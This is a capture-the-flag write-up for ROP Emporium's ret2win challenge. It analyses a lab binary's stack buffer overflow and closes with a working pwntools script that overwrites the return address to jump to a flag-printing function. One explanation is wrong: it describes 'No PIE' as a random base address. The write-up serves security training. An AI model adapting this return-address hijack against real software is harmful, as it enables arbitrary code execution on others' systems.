Ret2win is the first challenge from Rop Emporioum series.
We have to overwrite return address and call the win function to obtain the flag!


# Analyzing
Lets start with the File command.
```
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```
Nice! <br>
1. We have a 64 bit executable. <br>
2. It is not stripped (that means that we have the original function names),  <br>
3. And its dynamically linked (that means third party shared objects is not included during compilation and a pointer to these functions is used to access them on runtime when libraries will load up to memory)


Lets continue by checking the protections of the binary running checksec
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0                               3ret2win
```
1. Stack cookie Not found (canary is a value that is added during compilation procces to prevent buffer overflow attacks.In our case no protection was detected)
2. NX enabled (nx is a mechanism that makes some certain areas of the binary non executable, since it as enabled we cannot overwrite any ip register to jump into our shellcode stored on stack)
3. No pie (A random base address is used for main executable)

Lets continue by disassembling the binary

# main:
```c
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;

```
Not to much code for our main function. just some introduction prints and a call to pwnme() function.

# pwnme:

```
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 0x38uLL);
  return puts("Thank you!");
```
common sense is that a vulnerability may lives here.
Lets start analyzing each row. <br>

First of all a 32 byte char buffer is allocated on the stack. <br> 
Then some hints is printed into our console and a read 0x38 bytes appear.
What if we try to fit 56 bytes into a 32 byte buffer?

As we know stack grows downwards so our stack frame of this function woulld look like this 
![image](https://github.com/user-attachments/assets/69ecb829-01c2-4078-9ee2-020c12e6f9da)

So writing 56 bytes will completely overwrite the buffer, stacks frame base address and Î¿bviously 
the return address.Thats means that now we can execute whatever we want on the binary. Our goal is obtain the flag. <br>

looking further on the dissasembler a function ret2win is completely what we are looking for 

# ret2win
```
puts("Well done! Here's your flag:");
return system("/bin/cat flag.txt");
```
Gathering all this information, the path we need to follow revealed, <br> 
overwriting the stored ip we can execute ret2win code and trigger system commands.
Since there is no stack cookies or pie, aslr enabled we can grab the hardcoded address and craft our exploit 

# Exploiting
Writing our exploit
```python
from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./ret2win') #FIXME

target = process([elfexe.path])

payload  = b"A"* 40      # Fill the buffer and overwrite base address 
payload += p64(0x400770) # ret for alignment
payload += p64(0x400756) # Jump to ret2win function

target.sendafter("> ", payload) 
target.interactive()
    
```
We manage to get the flag!
``
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
``
